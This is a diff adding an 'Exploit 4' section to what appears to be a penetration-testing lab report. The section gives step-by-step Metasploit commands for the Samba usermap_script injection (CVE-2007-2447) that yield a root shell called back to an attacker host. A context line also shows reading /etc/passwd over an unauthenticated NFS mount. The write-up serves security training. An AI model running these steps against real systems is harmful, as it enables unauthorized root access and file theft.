@@ -86,3 +86,29 @@ Key open ports found:
   - Exploitation: the misconfigured export allowed mounting without authentication.
   - Actions on Objectives: browsed the target's root filesystem, demonstrating full read access to system files.
 - **Outcome / Impact:** Gained unauthenticated read access to the target's entire filesystem via NFS. (Optional further step: files could be read directly, e.g. `cat /tmp/nfs_mount/etc/passwd`.)
+
+
+## Exploit 4: Samba usermap_script Command Injection
+
+- **Service / Port:** Samba (SMB) / 139, 445
+- **Vulnerability:** Samba "username map script" Command Execution (CVE-2007-2447)
+- **Tool Used:** Metasploit — exploit/multi/samba/usermap_script
+- **Why This Tool:** The vulnerable Samba version range (3.X-4.X) has a specific configuration flaw allowing shell metacharacters to be injected via the username field. Metasploit's dedicated module automates crafting and delivering this injection reliably, which would otherwise require manually replicating the exact SMB protocol interaction.
+- **Steps:**
+  1. `nmap -p 139,445 -sV 192.168.1.3` — confirmed Samba smbd 3.X-4.X
+  2. `msfconsole` → `search usermap_script`
+  3. `use 0` (exploit/multi/samba/usermap_script)
+  4. `set RHOSTS 192.168.1.3`
+  5. `set LHOST 192.168.1.4`
+  6. `exploit`
+  7. `whoami` / `id` to confirm access
+- **Evidence:** evidence/exploit4.png
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
+  - Reconnaissance: nmap identified the vulnerable Samba version on 139/445.
+  - Weaponization: selecting the usermap_script module and configuring RHOSTS/LHOST paired the vulnerability with a working payload.
+  - Delivery/Exploitation: running `exploit` sent the malicious username field, triggering command injection.
+  - Installation/C2: a command shell session was opened, giving remote control of the target.
+  - Actions on Objectives: ran `whoami`/`id`, confirming root-level access on the target.
+- **Outcome / Impact:** Obtained a root-level (uid=0, gid=0) remote command shell on the target via SMB command injection.
+
+  
